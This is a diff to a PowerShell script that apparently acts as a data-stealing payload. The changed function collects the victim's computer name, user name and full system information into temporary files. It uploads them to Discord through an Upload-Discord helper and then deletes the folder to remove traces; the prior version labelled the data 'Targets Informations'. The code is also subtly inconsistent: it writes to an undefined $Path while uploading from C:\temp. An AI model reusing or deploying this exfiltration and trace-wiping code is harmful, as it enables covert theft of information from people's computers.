@@ -10,25 +10,31 @@ function Get-Nirsoft {
 
 }
 
-function ComputerInfo {
+function SysInfo {
 cd C:\
 mkdir \temp
 cd \temp
+
+#1. Get User Informations
 # Get the date at the selected format
 $date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
-
 # Get computer name and user name
 $namepc = $env:computername
 $user = $env:UserName
-
-# Creates the file with the format i want
-$Info1content = "Nom du pc : $namepc`r`nUser : $user`r`nDate : $date"
-
+# Creates the files with the format i want
+$userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
 # Writes the output of $Info1content to "Info1content.txt"
-$Info1content | Out-File -FilePath "C:\Temp\Info1content.txt" -Encoding utf8
+$userInfo | Out-File -FilePath "C:\Temp\userInfo.txt" -Encoding utf8
 
-#Upload to Discord via the Upload-Discord function
-Upload-Discord -file "C:\temp\Info1content.txt" -text "Targets Informations :"
+#2. Get Computer Informations
+#Create the file to store the info
+New-Item -Path "$Path\ComputerInfo.txt" -ItemType File
+#Get info and then store it to the file
+Get-ComputerInfo | Out-File -FilePath "$Path\ComputerInfo.txt"
+
+#Upload files to Discord via the Upload-Discord function
+Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
+Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
 
 #Removing every file to remove traces
 rmdir -R \temp
